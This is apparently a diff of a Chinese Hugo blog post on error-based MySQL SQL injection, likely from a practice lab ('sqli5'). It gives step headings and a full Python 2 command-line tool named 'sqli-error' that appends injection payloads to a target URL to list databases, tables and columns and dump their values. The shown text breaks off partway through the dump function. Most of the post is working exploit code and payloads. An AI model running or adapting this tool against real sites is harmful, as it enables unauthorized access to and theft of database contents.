-</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(.*?)~~:~~&#39;</span>,html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>split()
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print value</span>
-</span></span><span style="display:flex;"><span>        stri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print len(value)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(value)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,num_column):
-</span></span><span style="display:flex;"><span>                stri <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%-15s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> value[x]
-</span></span><span style="display:flex;"><span>            print stri
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>    print figlet_format(<span style="color:#e6db74">&#34;sqli-error&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> OptionParser()
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-u&#34;</span>,<span style="color:#e6db74">&#34;--URL&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
-</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url&#34;</span>,
-</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get url&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-D&#34;</span>,<span style="color:#e6db74">&#34;--DB&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
-</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;db_name&#34;</span>,
-</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get database name&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-T&#34;</span>,<span style="color:#e6db74">&#34;--TBL&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
-</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;table_name&#34;</span>,
-</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get table name&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-C&#34;</span>,<span style="color:#e6db74">&#34;--COL&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
-</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;column_name&#34;</span>,
-</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get column name&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--dbs&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
-</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dbs&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get all database name&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--current-db&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
-</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;current_db&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get current database name&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--current-user&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
-</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;current_user&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get current user name&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--tables&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
-</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tables&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get tables from databases&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--columns&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
-</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;columns&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get columns from tables&#34;</span>)
-</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--dump&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
-</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dump&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get value&#34;</span>)
-</span></span><span style="display:flex;"><span>    (options,args) <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> options <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>url <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
-</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>dump <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>column_name <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>table_name <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>db_name:
-</span></span><span style="display:flex;"><span>        getAllcontent(options<span style="color:#f92672">.</span>url,options<span style="color:#f92672">.</span>column_name,options<span style="color:#f92672">.</span>table_name,options<span style="color:#f92672">.</span>db_name)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>table_name <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>db_name:
-</span></span><span style="display:flex;"><span>        getAllColumnsByTable(options<span style="color:#f92672">.</span>url,options<span style="color:#f92672">.</span>table_name,options<span style="color:#f92672">.</span>db_name)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>db_name:
-</span></span><span style="display:flex;"><span>        getAllTablesByDb(options<span style="color:#f92672">.</span>url,options<span style="color:#f92672">.</span>db_name)    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>dbs:
-</span></span><span style="display:flex;"><span>        getAllDatabases(options<span style="color:#f92672">.</span>url)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>current_db:
-</span></span><span style="display:flex;"><span>        getCurrentDb(options<span style="color:#f92672">.</span>url)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>current_user:
-</span></span><span style="display:flex;"><span>        getCurrentUser(options<span style="color:#f92672">.</span>url)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>url:
-</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;you input: sqli-error.py -u www.xxx.com/?id=xx&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    main()
-</span></span></code></pre></div></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x03-注入步骤>0x03 注入步骤</h3><ol><li><p>猜测闭合字符
+<img src=/img/post/sqli5_get_closed_character.png alt=得到闭合字符>
+<img src=/img/post/sqli5_check_closed_character.png alt=确认闭合字符></p></li><li><p>猜测列数
+<img src=/img/post/sqli5_order_by.png alt=得到列数></p></li><li><p>尝试得到显示位
+<img src=/img/post/sqli5_get_display_point.png alt=尝试得到显示位></p></li><li><p>报错得到数据库个数
+<img src=/img/post/sqli5_get_db_num.png alt=报错得到数据库个数></p></li><li><p>报错得到数据库名
+<img src=/img/post/sqli5_get_db_name.png alt=报错得到数据库名></p></li><li><p>报错得到表名
+<img src=/img/post/sqli5_get_table_num.png alt=报错得到表的个数>
+<img src=/img/post/sqli5_get_table_name.png alt=报错得到表名></p></li><li><p>报错得到列名
+<img src=/img/post/sqli5_get_column_num.png alt=报错得到列的个数>
+<img src=/img/post/sqli5_get_column_name1.png alt=报错得到列名1>
+<img src=/img/post/sqli5_get_column_name2.png alt=报错得到列名2></p></li><li><p>得到列值
+<img src=/img/post/sqli5_get_column_value_num.png alt=报错得到数据条数>
+<img src=/img/post/sqli5_get_column_value.png alt=报错得到列的值></p></li></ol><h3 id=0x04-附上利用代码>0x04 附上利用代码</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-  </span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib2
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> binascii
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pyfiglet <span style=color:#f92672>import</span> figlet_format
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> optparse <span style=color:#f92672>import</span> OptionParser
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># --dbs url</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getAllDatabases</span>(url):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print url</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39; and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/**/&#34;</span><span style=color:#f92672>.</span>join(payload<span style=color:#f92672>.</span>split())
+</span></span><span style=display:flex><span>    dbs_num_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print dbs_num_url</span>
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(dbs_num_url)
+</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print html</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ~~:~~5~~:~~</span>
+</span></span><span style=display:flex><span>    dbs_num <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(\d*?)~~:~~&#39;</span>, html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;database num: </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> dbs_num
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;database name: &#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> index <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>,dbs_num):
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39; and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style=color:#f92672>%</span> index
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/**/&#34;</span><span style=color:#f92672>.</span>join(payload<span style=color:#f92672>.</span>split())
+</span></span><span style=display:flex><span>        db_name_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(db_name_url)
+</span></span><span style=display:flex><span>        html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>        db_name <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(.*?)~~:~~&#39;</span>, html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> db_name
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getCurrentDb</span>(url):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print &#34;CurrentDb is: aaaa&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print url</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    current_db_name_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span>
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(current_db_name_url)
+</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    current_db_name <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(.*?)~~:~~&#39;</span>, html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;Current database is: </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> current_db_name
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getCurrentUser</span>(url):
+</span></span><span style=display:flex><span>    db_name_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span>
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(db_name_url)
+</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    user_name <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(.*?)~~:~~&#39;</span>, html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;Current user is: </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> user_name
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># --tables -D database url</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getAllTablesByDb</span>(url,db_name):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print db_name</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print url</span>
+</span></span><span style=display:flex><span>    db_name_hex <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0x&#34;</span> <span style=color:#f92672>+</span> binascii<span style=color:#f92672>.</span>b2a_hex(db_name)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print db_name_hex</span>
+</span></span><span style=display:flex><span>    tables_num_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span> <span style=color:#f92672>%</span> db_name_hex
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(tables_num_url)
+</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print html</span>
+</span></span><span style=display:flex><span>    tables_num <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(\d*?)~~:~~&#39;</span>, html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print tables_num</span>
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> has </span><span style=color:#e6db74>%d</span><span style=color:#e6db74> table&#34;</span> <span style=color:#f92672>%</span> (db_name, tables_num)
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;table name: &#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> index <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>,tables_num):
+</span></span><span style=display:flex><span>        tables_name_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/**/limit/**/</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span> <span style=color:#f92672>%</span> (db_name_hex, index)
+</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(tables_name_url)
+</span></span><span style=display:flex><span>        html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print html</span>
+</span></span><span style=display:flex><span>        table_name <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(.*?)~~:~~&#39;</span>,html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> table_name
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getAllColumnsByTable</span>(url,table_name,db_name):
+</span></span><span style=display:flex><span>    db_name_hex <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0x&#34;</span> <span style=color:#f92672>+</span> binascii<span style=color:#f92672>.</span>b2a_hex(db_name)
+</span></span><span style=display:flex><span>    table_name_hex <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0x&#34;</span> <span style=color:#f92672>+</span> binascii<span style=color:#f92672>.</span>b2a_hex(table_name)
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> and table_schema=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style=color:#f92672>%</span> (table_name_hex,db_name_hex)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print payload</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/**/&#34;</span><span style=color:#f92672>.</span>join(payload<span style=color:#f92672>.</span>split())
+</span></span><span style=display:flex><span>    column_num_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(column_num_url)
+</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    column_num <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(\d*?)~~:~~&#39;</span>,html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print column_num</span>
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;Table </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> of the </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> has </span><span style=color:#e6db74>%d</span><span style=color:#e6db74> columns&#34;</span> <span style=color:#f92672>%</span> (table_name,db_name,column_num)
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;Table </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> contains the column name:&#34;</span> <span style=color:#f92672>%</span> table_name
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> index <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>,column_num):
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> and table_schema=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> limit </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style=color:#f92672>%</span> (table_name_hex,db_name_hex,index)
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/**/&#34;</span><span style=color:#f92672>.</span>join(payload<span style=color:#f92672>.</span>split())
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print payload</span>
+</span></span><span style=display:flex><span>        column_value_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(column_value_url)
+</span></span><span style=display:flex><span>        html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print html</span>
+</span></span><span style=display:flex><span>        column_name <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(.*?)~~:~~&#39;</span>,html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> column_name
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getAllcontent</span>(url,column_name,table_name,db_name):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print url</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print column_name</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print table_name</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print db_name</span>
+</span></span><span style=display:flex><span>    column_name <span style=color:#f92672>=</span> column_name<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    num_column <span style=color:#f92672>=</span> len(column_name) <span style=color:#75715e>#想得到的字段的个数</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print column_name</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print num_column</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>.</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style=color:#f92672>%</span> (db_name,table_name)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print payload</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/**/&#34;</span><span style=color:#f92672>.</span>join(payload<span style=color:#f92672>.</span>split())
+</span></span><span style=display:flex><span>    column_value_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(column_value_url)
+</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print html</span>
+</span></span><span style=display:flex><span>    column_value_num <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(\d*?)~~:~~&#39;</span>,html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
